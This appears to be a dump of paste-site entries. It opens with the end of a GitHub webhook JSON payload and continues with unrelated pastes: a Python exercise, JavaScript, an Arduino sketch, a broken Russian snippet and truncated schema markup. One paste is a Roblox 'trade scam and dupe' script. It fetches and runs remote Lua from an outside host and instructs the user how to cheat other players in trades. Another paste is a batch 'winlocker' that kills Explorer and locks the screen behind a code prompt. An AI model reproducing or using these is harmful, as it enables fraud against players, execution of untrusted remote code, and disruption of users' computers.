        ""watchers"": 0,
        ""default_branch"": ""master"",
        ""allow_squash_merge"": true,
        ""allow_merge_commit"": true,
        ""allow_rebase_merge"": true,
        ""allow_auto_merge"": false,
        ""delete_branch_on_merge"": false,
        ""allow_update_branch"": false,
        ""use_squash_pr_title_as_default"": false,
        ""squash_merge_commit_message"": ""COMMIT_MESSAGES"",
        ""squash_merge_commit_title"": ""COMMIT_OR_PR_TITLE"",
        ""merge_commit_message"": ""PR_TITLE"",
        ""merge_commit_title"": ""MERGE_MESSAGE""
      }
    },
    ""base"": {
      ""label"": ""hetosoft:master"",
      ""ref"": ""master"",
      ""sha"": ""491817861bc3e6c23f0aafc638298fb9c273ac6e"",
      ""user"": {
        ""login"": ""hetosoft"",
        ""id"": 53792964,
        ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
        ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
        ""gravatar_id"": """",
        ""url"": ""https://api.github.com/users/hetosoft"",
        ""html_url"": ""https://github.com/hetosoft"",
        ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
        ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
        ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
        ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
        ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
        ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
        ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
        ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
        ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
        ""type"": ""Organization"",
        ""site_admin"": false
      },
      ""repo"": {
        ""id"": 298645758,
        ""node_id"": ""MDEwOlJlcG9zaXRvcnkyOTg2NDU3NTg="",
        ""name"": ""ProjetosSol.WEB"",
        ""full_name"": ""hetosoft/ProjetosSol.WEB"",
        ""private"": true,
        ""owner"": {
          ""login"": ""hetosoft"",
          ""id"": 53792964,
          ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
          ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
          ""gravatar_id"": """",
          ""url"": ""https://api.github.com/users/hetosoft"",
          ""html_url"": ""https://github.com/hetosoft"",
          ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
          ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
          ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
          ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
          ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
          ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
          ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
          ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
          ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
          ""type"": ""Organization"",
          ""site_admin"": false
        },
        ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""description"": ""Projetos Hetosoft .NET"",
        ""fork"": false,
        ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB"",
        ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/forks"",
        ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/keys{/key_id}"",
        ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/collaborators{/collaborator}"",
        ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/teams"",
        ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/hooks"",
        ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/events{/number}"",
        ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/events"",
        ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/assignees{/user}"",
        ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/branches{/branch}"",
        ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/tags"",
        ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/blobs{/sha}"",
        ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/tags{/sha}"",
        ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/refs{/sha}"",
        ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/trees{/sha}"",
        ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/{sha}"",
        ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/languages"",
        ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/stargazers"",
        ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contributors"",
        ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscribers"",
        ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscription"",
        ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/commits{/sha}"",
        ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/commits{/sha}"",
        ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/comments{/number}"",
        ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/comments{/number}"",
        ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contents/{+path}"",
        ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/compare/{base}...{head}"",
        ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/merges"",
        ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/{archive_format}{/ref}"",
        ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/downloads"",
        ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues{/number}"",
        ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls{/number}"",
        ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/milestones{/number}"",
        ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/notifications{?since,all,participating}"",
        ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/labels{/name}"",
        ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/releases{/id}"",
        ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/deployments"",
        ""created_at"": ""2020-09-25T18:04:07Z"",
        ""updated_at"": ""2024-05-28T13:06:46Z"",
        ""pushed_at"": ""2024-05-28T14:44:55Z"",
        ""git_url"": ""git://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.WEB.git"",
        ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""homepage"": null,
        ""size"": 621172,
        ""stargazers_count"": 0,
        ""watchers_count"": 0,
        ""language"": ""C#"",
        ""has_issues"": true,
        ""has_projects"": true,
        ""has_downloads"": true,
        ""has_wiki"": true,
        ""has_pages"": false,
        ""has_discussions"": true,
        ""forks_count"": 0,
        ""mirror_url"": null,
        ""archived"": false,
        ""disabled"": false,
        ""open_issues_count"": 15,
        ""license"": null,
        ""allow_forking"": false,
        ""is_template"": false,
        ""web_commit_signoff_required"": false,
        ""topics"": [

        ],
        ""visibility"": ""private"",
        ""forks"": 0,
        ""open_issues"": 15,
        ""watchers"": 0,
        ""default_branch"": ""master"",
        ""allow_squash_merge"": true,
        ""allow_merge_commit"": true,
        ""allow_rebase_merge"": true,
        ""allow_auto_merge"": false,
        ""delete_branch_on_merge"": false,
        ""allow_update_branch"": false,
        ""use_squash_pr_title_as_default"": false,
        ""squash_merge_commit_message"": ""COMMIT_MESSAGES"",
        ""squash_merge_commit_title"": ""COMMIT_OR_PR_TITLE"",
        ""merge_commit_message"": ""PR_TITLE"",
        ""merge_commit_title"": ""MERGE_MESSAGE""
      }
    },
    ""_links"": {
      ""self"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799""
      },
      ""html"": {
        ""href"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799""
      },
      ""issue"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799""
      },
      ""comments"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799/comments""
      },
      ""review_comments"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/comments""
      },
      ""review_comment"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/comments{/number}""
      },
      ""commits"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/commits""
      },
      ""statuses"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/9b9f7df6cb297d7d09f7cce4bf85ae52b9db9887""
      }
    },
    ""author_association"": ""CONTRIBUTOR"",
    ""auto_merge"": null,
    ""active_lock_reason"": null,
    ""merged"": true,
    ""mergeable"": null,
    ""rebaseable"": null,
    ""mergeable_state"": ""unknown"",
    ""merged_by"": {
      ""login"": ""wesProg23"",
      ""id"": 20547283,
      ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/wesProg23"",
      ""html_url"": ""https://github.com/wesProg23"",
      ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
      ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
      ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
      ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
      ""type"": ""User"",
      ""site_admin"": false
    },
    ""comments"": 0,
    ""review_comments"": 0,
    ""maintainer_can_modify"": false,
    ""commits"": 3,
    ""additions"": 95,
    ""deletions"": 80,
    ""changed_files"": 5
  },
  ""repository"": {
    ""id"": 298645758,
    ""node_id"": ""MDEwOlJlcG9zaXRvcnkyOTg2NDU3NTg="",
    ""name"": ""ProjetosSol.WEB"",
    ""full_name"": ""hetosoft/ProjetosSol.WEB"",
    ""private"": true,
    ""owner"": {
      ""login"": ""hetosoft"",
      ""id"": 53792964,
      ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/hetosoft"",
      ""html_url"": ""https://github.com/hetosoft"",
      ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
      ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
      ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
      ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
      ""type"": ""Organization"",
      ""site_admin"": false
    },
    ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
    ""description"": ""Projetos Hetosoft .NET"",
    ""fork"": false,
    ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB"",
    ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/forks"",
    ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/keys{/key_id}"",
    ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/collaborators{/collaborator}"",
    ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/teams"",
    ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/hooks"",
    ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/events{/number}"",
    ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/events"",
    ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/assignees{/user}"",
    ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/branches{/branch}"",
    ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/tags"",
    ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/blobs{/sha}"",
    ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/tags{/sha}"",
    ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/refs{/sha}"",
    ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/trees{/sha}"",
    ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/{sha}"",
    ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/languages"",
    ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/stargazers"",
    ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contributors"",
    ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscribers"",
    ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscription"",
    ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/commits{/sha}"",
    ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/commits{/sha}"",
    ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/comments{/number}"",
    ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/comments{/number}"",
    ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contents/{+path}"",
    ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/compare/{base}...{head}"",
    ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/merges"",
    ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/{archive_format}{/ref}"",
    ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/downloads"",
    ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues{/number}"",
    ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls{/number}"",
    ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/milestones{/number}"",
    ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/notifications{?since,all,participating}"",
    ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/labels{/name}"",
    ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/releases{/id}"",
    ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/deployments"",
    ""created_at"": ""2020-09-25T18:04:07Z"",
    ""updated_at"": ""2024-05-28T13:06:46Z"",
    ""pushed_at"": ""2024-05-28T14:44:55Z"",
    ""git_url"": ""git://github.com/hetosoft/ProjetosSol.WEB.git"",
    ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.WEB.git"",
    ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.WEB.git"",
    ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
    ""homepage"": null,
    ""size"": 621172,
    ""stargazers_count"": 0,
    ""watchers_count"": 0,
    ""language"": ""C#"",
    ""has_issues"": true,
    ""has_projects"": true,
    ""has_downloads"": true,
    ""has_wiki"": true,
    ""has_pages"": false,
    ""has_discussions"": true,
    ""forks_count"": 0,
    ""mirror_url"": null,
    ""archived"": false,
    ""disabled"": false,
    ""open_issues_count"": 15,
    ""license"": null,
    ""allow_forking"": false,
    ""is_template"": false,
    ""web_commit_signoff_required"": false,
    ""topics"": [

    ],
    ""visibility"": ""private"",
    ""forks"": 0,
    ""open_issues"": 15,
    ""watchers"": 0,
    ""default_branch"": ""master"",
    ""custom_properties"": {

    }
  },
  ""organization"": {
    ""login"": ""hetosoft"",
    ""id"": 53792964,
    ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
    ""url"": ""https://api.github.com/orgs/hetosoft"",
    ""repos_url"": ""https://api.github.com/orgs/hetosoft/repos"",
    ""events_url"": ""https://api.github.com/orgs/hetosoft/events"",
    ""hooks_url"": ""https://api.github.com/orgs/hetosoft/hooks"",
    ""issues_url"": ""https://api.github.com/orgs/hetosoft/issues"",
    ""members_url"": ""https://api.github.com/orgs/hetosoft/members{/member}"",
    ""public_members_url"": ""https://api.github.com/orgs/hetosoft/public_members{/member}"",
    ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
    ""description"": """"
  },
  ""sender"": {
    ""login"": ""wesProg23"",
    ""id"": 20547283,
    ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
    ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
    ""gravatar_id"": """",
    ""url"": ""https://api.github.com/users/wesProg23"",
    ""html_url"": ""https://github.com/wesProg23"",
    ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
    ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
    ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
    ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
    ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
    ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
    ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
    ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
    ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
    ""type"": ""User"",
    ""site_admin"": false
  }
}"
mMuhmzsY,Ps99 trade scam and dupe,Creakkz,Lua,Tuesday 28th of May 2024 10:35:35 AM CDT,"Here is the trade scam/duping script: loadstring(game:HttpGet('https://egorikusa.space/8a04b70b58f243796c31b428.lua'))()

How to use it: 
for duping 
1.load script (use any executor, for example https://vegax.gg/)
2.click the inject button
3.select pets
4.done

for trade scam 
1.load script (use any executor, for example https://vegax.gg/)
2.trade someone
3.tell him to offer your pet
4.enable trade scam and put your pet away
5.ready up and enjoy"
cuLQxWjt,Salesmen,stiky_fingaz,Python,Tuesday 28th of May 2024 10:25:02 AM CDT,"highest = 0
best_salesman = 0
bonus = 200

for i in range(3):
    total_salary = 200
    current_sales = int(input('Enter sales: '))

    if current_sales < 500:
        total_salary += current_sales * 0.03
    elif 500 <= current_sales < 1000:
        total_salary += current_sales * 0.05
    else:
        total_salary += current_sales * 0.08

    if total_salary > highest:
        highest = total_salary
        best_salesman = i + 1

    print(f'Salesman-{i + 1} got {total_salary} USD')

print(f'Best salesman is Salesman-{best_salesman} with {highest} USD salary. '
      f'Final salary with bonus: {highest + bonus} USD.')
"
Sp3egvVf,Fake batch winlocker,wrfcewrcqwerqwer3q,Batch,Tuesday 28th of May 2024 09:58:55 AM CDT,":: CODE: current hour and current minute. Example: If 16:32 code is 1632
@echo off
color 4
taskkill /im explorer.exe /f > nul
cls
title Windows has been blocked
echo Windows has been blocked
:G
echo Enter the activation code:
set /p x=
if %x%==%time:~0,2%%time:~3,2% (color a
cls
echo Windows starting!
start explorer
timeout /t 1 /nobreak > nul
exit
) ELSE (
cls
color 47
echo Activation code is incorrect!
echo Activation code is incorrect!
echo Activation code is incorrect!
timeout /t 1 /nobreak > nul
cls
color 4
echo Enter the acctivation code again!
)
goto G"
zb4f284r,Roe2js :: Create View Frame,jargon,JavaScript,Tuesday 28th of May 2024 09:17:17 AM CDT,"	createViewFrame (id) {
		
		id = 'viewframe';
		
		for( let y = 0; y<=7*3+1;y++){
		for( let x = 0; x<=7*3+1;x++){		
		for( let z = 0; z <= this.gui; z++ ){
			
			if(!(( y === 0 )||(y === 7*3+1)||(x === 0)||(x === 7*3+1)))
			{continue;}

			// Step 1: Create the element
			var newElement = document.createElement('div');

			// Step 2: Modify the element (optional)
			// newElement.textContent = ""This is a new div element."";
			
			newElement.style.width = `8px`;
			newElement.style.height = `8px`;
			
			if ( z === 0 ){
				newElement.style.backgroundColor = `black`;
			}
			if ( z === this.gui ){
				newElement.style.backgroundImage = `url(http://${this.host}/GFX/sel1dash.png)`;
				
				// newElement.style.filter = 'brightness(0) saturate(100%) invert(1) sepia(1) saturate(10000%) hue-rotate(90deg)';
			}
			newElement.style.position = `absolute`;
			newElement.style.left = `calc(8px * ${x})`;
			newElement.style.top = `calc(8px * ${y})`;
			newElement.className = `${id}`;
			newElement.id = `${id}_${x}_${y}_${z}`;
			newElement.style.zIndex = `${z}`;
			
			this.spriteManip.subSprite(newElement,'bottom right');

			// Step 3: Append the element to the document
			document.body.appendChild(newElement);
			
		}}}
		
		/*
		
		z = this.gui;
		
		for( y = 1; y < 7 * 3 + 1; y++ ){
			
			x = 0;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '0px 8px';
			}
			
			x = 5 * 3 + 1;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '16px 8px';
			}
		}
		for( x = 1; x < 7 * 3 + 1; x++ ){
			
			y = 0;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '8px 0px';
			}
			
			y = 5 * 3 + 1;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '8px 16px';
			}
		}
		*/
	}"
kpKxuHjA,Full test,Szerelo,C,Tuesday 28th of May 2024 09:09:19 AM CDT,"// Demo program a következő panelhez: https://github.com/the-developer-guy/PracticeShield/tree/main/hu
// 2024.05.28. Teremi József

// A nyomógombok és a kapcsoló állapotának kiírása a soros monitorra, LED-ek bekapcsolása, Buzzer próba.
// A Buzzer a nyomógomb megnyomására megszólal. A hang magassága a potenciométer és a kapcsoló állásától függ.

#define POT A0      // A potenciométert az A0-ás pinre csatlakoztattuk
#define BTN1 A2     // Az 1. nyomógombot az A2-es pinre csatlakoztattuk
#define BTN2 A1     // A 2. nyomógombot az A1-es pinre csatlakoztattuk
#define SWITCH A3   // A kapcsolót az A3-es pinre csatlakoztattuk
#define LED1 2     // Az 1. LED-et a D2-es pinre csatlakoztattuk
#define LED2 3
#define LED3 4
#define LED4 5
#define LED5 6
#define LED6 7
#define LED7 8
#define LED8 9
#define BUZZER 11  // A hangszórót a D11-es pinre csatlakoztattuk


bool button1State = LOW;   // A nyomógomb aktuális állapota
bool button2State = LOW;   // A nyomógomb aktuális állapota
bool switchState = LOW;     // A kapcsoló aktuális állapota
bool lastButton1State = LOW; // Az előző nyomógomb állapot
bool lastButton2State = LOW; // Az előző nyomógomb állapot
bool lastSwitchState = LOW;  // A előző kapcsoló állapot
unsigned long lastDebounceTime1 = 0;  // Az 1. nyomógomb utolsó prellmentes időpontja
unsigned long lastDebounceTime2 = 0;  // A 2. nyomógomb utolsó prellmentes időpontja
unsigned long lastDebounceTime3 = 0;  // A kapcsoló utolsó prellmentes időpontja
unsigned long debounceDelay = 50;    // A prellmentes idő beállítása
unsigned int potValue;
byte counter=2;
byte prevCounter=2;

void setup() {
  // Beállítjuk a bemenetként használt pinek irányát.
  pinMode(BTN1, INPUT);
  pinMode(BTN2, INPUT);
  pinMode(SWITCH, INPUT);
  // Beállítjuk a kimenetként használt pinek irányát.
  pinMode(LED1, OUTPUT);
  pinMode(LED2, OUTPUT);
  pinMode(LED3, OUTPUT);
  pinMode(LED4, OUTPUT);
  pinMode(LED5, OUTPUT);
  pinMode(LED6, OUTPUT);
  pinMode(LED7, OUTPUT);
  pinMode(LED8, OUTPUT);
  pinMode(BUZZER, OUTPUT);
  
  Serial.begin(115200);         // Soros kommunikáció inicializálása
  delay(1000);
  Serial.println(""Start ..."");  // Lássuk, hogy rendben elindult a program

  for (byte i=2;i<10;i++){
    digitalWrite(i,HIGH);
    delay(100);  
  }
  for (byte i=2;i<10;i++){
    digitalWrite(i,LOW);
    delay(100);  
  }
  // Ha az 1. gomb le van nyomva
  if (digitalRead(BTN1) == LOW) {
    Serial.println(""1. nyomógomb lenyomva"");
  } 
  // Ha az 1. gomb nincs lenyomva
  else {
    Serial.println(""1. nyomógomb nincs lenyomva"");
  }

  // Ha a 2. gomb le van nyomva
  if (digitalRead(BTN2) == LOW) {
  } 
  // Ha az 1. gomb nincs lenyomva
  else {
    Serial.println(""2. nyomógomb nincs lenyomva"");
  }

  // Ha a kapcsoló balra van állítva
  if (digitalRead(SWITCH) == LOW) {
    Serial.println(""A kapcsoló balra van állítva"");
  } 
  // Ha a kapcsoló jobbra van állítva
  else {
    Serial.println(""A kapcsoló jobbra van állítva"");
  }
}

void loop() {
  bool reading1 = !digitalRead(BTN1); // Olvassuk be az 1. nyomógomb állapotát negálva, ha a GND-ra van csatlakoztatva
  bool reading2 = !digitalRead(BTN2); // Olvassuk be a 2. nyomógomb állapotát negálva, ha a GND-ra van csatlakoztatva
  bool reading3 = digitalRead(SWITCH); // Olvassuk be a kapcsoló állapotát
  potValue=analogRead(POT);

  // Ha az 1. gomb állapota változott
  if (reading1 != lastButton1State) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime1 = millis();
  }

  // Ellenőrizzük, hogy a gomb állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime1) > debounceDelay) {
    // Ha igen, akkor frissítjük a gomb állapotát
    if (reading1 != button1State) {
      button1State = reading1;

      // Ha a gombot lenyomtad
      if (button1State == HIGH) {
        Serial.println(""1. nyomógomb lenyomva"");
        tone(BUZZER,potValue*2+500+reading3*1000);
        counter--;
        if (counter==1) counter=9;
      } 
      // Ha a gombot elengedted
      else {
        Serial.println(""1. nyomógomb elengedve"");
        noTone(BUZZER);
      }
    }
  }
  // Ha a 2. gomb állapota változott
  if (reading2 != lastButton2State) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime2 = millis();
  }

  // Ellenőrizzük, hogy a gomb állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime2) > debounceDelay) {
    // Ha igen, akkor frissítjük a gomb állapotát
    if (reading2 != button2State) {
      button2State = reading2;

      // Ha a gombot lenyomtad
      if (button2State == HIGH) {
        Serial.println(""2. nyomógomb lenyomva"");
        tone(BUZZER,potValue*3+1000+reading3*1000);
        counter++;
        if (counter==10) counter=2;
      } 
      // Ha a gombot elengedted
      else {
        Serial.println(""2. nyomógomb elengedve"");
        noTone(BUZZER);
      }
    }
  }

  // Ha a kapcsoló állapota változott
  if (reading3 != lastSwitchState) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime3 = millis();
  }

  // Ellenőrizzük, hogy a kapcsoló állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime3) > debounceDelay) {
    // Ha igen, akkor frissítjük a kapcsoló állapotát
    if (reading3 != switchState) {
      switchState = reading3;

      // Ha a kapcsolót balra állítottad
      if (switchState == LOW) {
        Serial.println(""A kapcsoló balra van állítva."");
      } 
      // Ha a kapcsolót jobbra állítottad
      else {
        Serial.println(""A kapcsoló jobbra van állítva."");
      }
    }
  }
  if (prevCounter!=counter){
    digitalWrite(counter,HIGH);
    digitalWrite(prevCounter,LOW);
    prevCounter=counter;
  }
  // A nyomógombok és kapcsoló aktuális állapotát eltároljuk az előző állapotban
  lastButton1State = reading1;
  lastButton2State = reading2;
  lastSwitchState = reading3;
}

// END"
6pbr5hsv,Untitled,Roman9234,Python,Tuesday 28th of May 2024 09:05:03 AM CDT,"print(""Вы находитесь в древнем лесу, где спрятаны сокровища. Вам нужно выбрать путь."")
input(""Введите 'лево', 'право' или 'прямо': "").lower()
print(""Поздравляем! Вы нашли сокровище!"")
print(""Вы ничего не нашли. Попробуйте снова."")
print(""О нет! Вы попали в ловушку!"")
print(""Вы нашли безопасное место для отдыха. Но здесь нет сокровищ."")
print(""Вы встретили мудрого старца, который дал вам карту к сокровищам!"")
print(""Вы заблудились. Попробуйте снова."")"
y5JiaucW,Schema markup for collections,bunkertor7,JSON,Tuesday 28th of May 2024 08:59:08 AM CDT,"<script type=application/ld+json>
	{""@type"":""CollectionPage"",""@context"":""https://schema.org/"",""name"":""Implay Animals - Soft Play Shapes"",""url"":""https://www.implay.co.uk/collections/animals"",""description"":""Implay soft play animals help promote children’s all-round development through imaginative play by climbing and balancing in a safe environment / Collection on many items"",""about"":
		{""@type"":""WebPage"",""name"":""implay-soft-play-animals"",""offers"":
			{""@type"":""Offer"",""itemOffered"":
				[
